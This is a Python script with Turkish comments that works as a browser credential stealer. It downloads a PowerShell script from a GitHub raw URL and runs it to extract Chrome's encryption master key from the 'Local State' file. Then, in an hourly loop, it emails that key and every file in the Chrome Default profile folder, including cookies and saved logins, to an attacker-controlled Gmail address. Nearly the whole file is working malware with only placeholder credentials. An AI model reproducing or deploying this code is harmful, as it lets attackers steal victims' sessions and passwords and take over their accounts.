import requests
import os
import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time


def download_github_file_to_onedrive(github_file_url, filename):
    try:
        onedrive_path = os.path.join(os.getenv("USERPROFILE"), "OneDrive")

        if not os.path.exists(onedrive_path):
            raise FileNotFoundError(f"OneDrive klasörü bulunamadı: {onedrive_path}")

        # GitHub'dan dosyayı indir
        response = requests.get(github_file_url)
        response.raise_for_status()  # HTTP hatalarını kontrol et

        # Kaydedilecek dosya yolu
        file_path = os.path.join(onedrive_path, filename)

        # İndirilen içeriği dosyaya yaz
        with open(file_path, 'wb') as file:
            file.write(response.content)

        print(f"DOWNLOADED: {file_path}")
        return file_path
    except Exception as e:
        print(f"Hata: {e}")
        return None


def run_powershell_script(script_path, input_file_path, output_file_path):
    try:
        # PowerShell komutunu oluştur
        command = [
            "powershell",
            "-Command",
            f"& '{script_path}' -InputFilePath '{input_file_path}' -OutputFilePath '{output_file_path}'"
        ]

        # PowerShell komutunu çalıştır
        result = subprocess.run(command, capture_output=True, text=True)

        # Çıktı ve hata mesajlarını yazdır
        if result.returncode == 0:
            print("PowerShell ERROR.")

            print(result.stdout)
        else:
            print("PowerShell ERROR.")
            print("Hata:")
            print(result.stderr)
    except Exception as e:
        print(f"Hata: {e}")


def send_email_with_attachment(subject, message, from_email, to_email, login_pwd, attachment_path):
    try:
        # E-posta yapısını oluştur
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = subject

        # Mesaj gövdesi
        msg.attach(MIMEText(message, 'plain'))

        # Eklenti (dosya)
        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, "rb") as attachment_file:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment_file.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename={os.path.basename(attachment_path)}"
                )
                msg.attach(part)
        else:
            print(f"Ek dosyası bulunamadı: {attachment_path}")
            return

        # SMTP Sunucusuna bağlan ve e-posta gönder
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(from_email, login_pwd)
            server.send_message(msg)
            print(f"EMAIL SENDED: {to_email}")
    except Exception as e:
        print(f"EMAIL COULDNT SEND: {e}")


def send_email_with_multiple_attachments(subject, message, from_email, to_email, login_pwd, attachments):
    try:

        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = subject

        msg.attach(MIMEText(message, 'plain'))

        # Tüm ek dosyaları e-postaya ekle
        for attachment_path in attachments:
            if os.path.exists(attachment_path):
                with open(attachment_path, "rb") as attachment_file:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment_file.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        "Content-Disposition",
                        f"attachment; filename={os.path.basename(attachment_path)}"
                    )
                    msg.attach(part)
            else:
                print(f"Ek dosya bulunamadı: {attachment_path}")

        # SMTP Sunucusuna bağlan ve e-posta gönder
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(from_email, login_pwd)
            server.send_message(msg)
            print(f"EMAIL SENDED: {to_email}")
    except Exception as e:
        print(f"EMAIL COULDNT SENDED: {e}")


def send_log_periodically():
    # OneDrive yolunu al
    onedrive_path = os.path.join(os.getenv("USERPROFILE"), "OneDrive")
    masterkey_file = os.path.join(onedrive_path, "masterkey.txt")

    # Gönderim için e-posta bilgileri
    from_email = "YOUR EMAIL"
    to_email = "YOUR EMAIL"
    login_pwd = "EMAIL PASSWORD"  # Gmail uygulama şifresi
    subject = "COOKIES"
    message = "MASTERKEY AND Chrome Default"

    # Gönderilecek klasör yolu
    chrome_default_path = os.path.join(
        os.getenv("USERPROFILE"), "AppData", "Local", "Google", "Chrome", "User Data", "Default"
    )

    # Belirli aralıklarla e-posta gönder
    while True:
        attachments = []

        # Masterkey dosyasını ekle
        if os.path.exists(masterkey_file):
            attachments.append(masterkey_file)
        else:
            print(f"Masterkey not found: {masterkey_file}")

        # Default klasöründeki tüm dosyaları ekle
        if os.path.exists(chrome_default_path):
            files = [os.path.join(chrome_default_path, f) for f in os.listdir(chrome_default_path) if os.path.isfile(os.path.join(chrome_default_path, f))]
            attachments.extend(files)
        else:
            print(f"Chrome Default directory not found: {chrome_default_path}")

        # Eğer eklenebilir dosyalar varsa e-posta gönder
        if attachments:
            send_email_with_multiple_attachments(subject, message, from_email, to_email, login_pwd, attachments)
        else:
            print("ERROR NO FILES")

        # 1 saat bekle (3600 saniye)
        time.sleep(3600)


# GitHub ham dosya URL'si (GitHub Raw URL)
github_raw_url = "GIT HUB RAW URL /getMasterKey.ps1"

# İndirilecek dosyanın adı
output_filename = "getMasterKey.ps1"

# Chrome Local State dosyası yolu (örnek yol)
input_file_path = os.path.join(
    os.getenv("USERPROFILE"), "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
)

# Master key çıkış dosyası yolu
output_file_path = os.path.join(
    os.getenv("USERPROFILE"), "OneDrive", "masterkey.txt"
)

# Dosyayı indir ve OneDrive'a kaydet
script_path = download_github_file_to_onedrive(github_raw_url, output_filename)

# Eğer dosya indirildiyse PowerShell komutunu çalıştır
if script_path:
    run_powershell_script(script_path, input_file_path, output_file_path)


send_log_periodically()
